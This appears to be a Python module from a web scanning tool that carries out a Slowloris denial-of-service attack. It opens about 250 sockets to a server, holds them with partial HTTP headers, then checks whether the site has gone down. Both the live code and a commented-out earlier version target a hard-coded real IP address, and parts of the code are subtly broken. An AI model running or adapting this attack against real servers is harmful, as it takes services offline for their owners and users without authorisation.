import socket
from multiprocessing import Process, Queue
import random
import time
import requests

# def loris():
#     array_s = list(map(lambda x: socket.socket(socket.AF_INET, socket.SOCK_STREAM),
#                        list(range(1,250))))
#
#     party_packet = "GET / HTTP/1.1\n" + \
#                    "Connection: Keep-Alive\n"
#
#     for s in array_s:
#         s.connect(("137.74.193.103", 80))
#         s.send(party_packet)
#
#     while 1:
#         for s in array_s:
#             s.send("X-a: " + str(random.randint(0, 5000)) + "\n")
#         time.sleep(8)


class SlowlorisModule(object):
    """
    Module attacks scanned website. The Method of attack is slowloris.
    """
    def __init__(self):
        """
        Constructor of the class.
        """
        self._result = {}
        self._id_mod = "dos"

    def _loris_attack(self, ip_address, port, q):
        """
        Method implements slowloris attack.
        :param ip_address: Ip address of server.
        :param port: Port of server.
        :param q: Message queue between process
        :return: None
        """
        array_s = list(map(lambda x: socket.socket(socket.AF_INET,
                                                   socket.SOCK_STREAM),
                           list(range(1,250))))

        party_packet = "GET / HTTP/1.1\n" + \
                       "Connection: Keep-Alive\n"

        for s in array_s:
            s.connect((ip_address, port))
            s.send(party_packet)

        q.put("message")

        for i in range(1,3):
            for s in array_s:
                try:
                    s.send("X-a: " + str(random.randint(0, 5000)) + "\n")
                except:
                    continue
            time.sleep(15)

    def scan(self, data):
        """
        Scanning method.

        :param data: Ip and port of server. Format: xxx.xxx.xxx.xxx:aaaa
        :return: None.
        """
        ip_address = data[0]
        port = data[1]
        q = Queue()
        Process(target=self._loris_attack,
                args=(ip_address, port, q)).start()
        try:
            while(q.empty()):
                time.sleep(1)

            r = requests.get("http://"+ip_address+":"+str(port),
                             timeout=5.000)
        except:
            self._result["dos_result"] = "Attack was successful!"
        if "dos_result" not in self._result.keys():
            self._result["dos_result"] = "Attack failed!"

    def get_id(self):
        """
        Method which returns id of the module

        :return: Id of module
        """
        return self._id_mod

    def get_result(self):
        """
        Method which returns id of the Module

        :return: Dict with results.
        """
        return self._result

if __name__ == "__main__":
    m = SlowlorisModule()
    m.scan("137.74.193.103", 8080)
    print(m.get_result())
